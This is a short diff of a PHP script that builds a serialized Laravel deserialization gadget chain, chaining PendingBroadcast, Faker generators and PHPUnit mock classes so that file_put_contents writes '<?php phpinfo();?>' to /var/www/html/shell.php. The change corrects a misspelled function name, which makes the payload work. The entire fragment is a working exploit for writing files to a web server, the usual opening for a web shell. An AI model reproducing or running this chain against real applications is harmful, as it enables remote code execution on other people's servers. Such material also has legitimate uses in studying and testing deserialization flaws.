@@ -59,7 +59,7 @@ namespace
 {
 $staticInvocation = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation(array("/var/www/html/shell.php","<?php phpinfo();?>"));
 $defaultgererator = new Faker\DefaultGenerator($staticInvocation);
-$returncallback = new PHPUnit\Framework\MockObject\Stub\ReturnCallback("file_put_cntents");
+$returncallback = new PHPUnit\Framework\MockObject\Stub\ReturnCallback("file_put_contents");
 $validgenerator = new Faker\ValidGenerator($defaultgererator,$returncallback);
 $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($validgenerator,"pass");
 echo serialize($pendingbroadcast);
